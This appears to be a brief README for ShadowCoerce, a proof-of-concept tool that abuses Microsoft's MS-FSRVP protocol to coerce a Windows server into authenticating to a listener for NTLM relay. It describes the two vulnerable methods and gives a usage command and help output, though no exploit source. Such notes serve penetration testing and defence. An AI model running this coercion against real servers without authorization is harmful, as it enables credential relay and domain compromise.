# ShadowCoerce

MS-FSRVP abuse (ShadowCoerce), NTLMv2 Relay Tools.

## Date

Build on 2021-12-31.

## Synopsis

MS-FSRVP is Microsoft's File Server Remote VSS Protocol. It's used for creating shadow copies of file shares on a remote computer, and for facilitating backup applications in performing application-consistent backup and restore of data on SMB2 shares.

Similarly to other MS-RPC abuses, this works by using a specific method relying on remote UNC paths. In this case, at the time of writing, two methods were detected as vulnerable: `IsPathSupported` and `IsPathShadowCopied`.

## Need

`File Server VSS Agent Service` is install on the target server.

## Example

```bash
$ shadowcoerce.py -d "domain" -u "user" -p "password" LISTENER TARGET
```

## Tools Options

```bash
$ python3 shadowcoerce.py -h
usage: shadowcoerce.py [-h] [-u USERNAME] [-p PASSWORD] [-d DOMAIN] [-hashes [LMHASH]:NTHASH] [-ts]
                       [-debug]
                       listener target

MS-FSRVP authentication coercion PoC

positional arguments:
  listener              ip address or hostname of listener
  target                ip address or hostname of target

options:
  -h, --help            show this help message and exit
  -u USERNAME, --username USERNAME
                        valid username
  -p PASSWORD, --password PASSWORD
                        valid password
  -d DOMAIN, --domain DOMAIN
                        valid domain name
  -hashes [LMHASH]:NTHASH
                        NT/LM hashes (LM hash can be empty)
  -ts                   Adds timestamp to every logging output
  -debug                Turn DEBUG output ON
```

## Related Links

[MS-FSRVP abuse (ShadowCoerce) - The Hacker Recipes](https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/ms-fsrvp)

[GitHub - ShutdownRepo/ShadowCoerce: MS-FSRVP coercion abuse PoC](https://github.com/ShutdownRepo/ShadowCoerce)
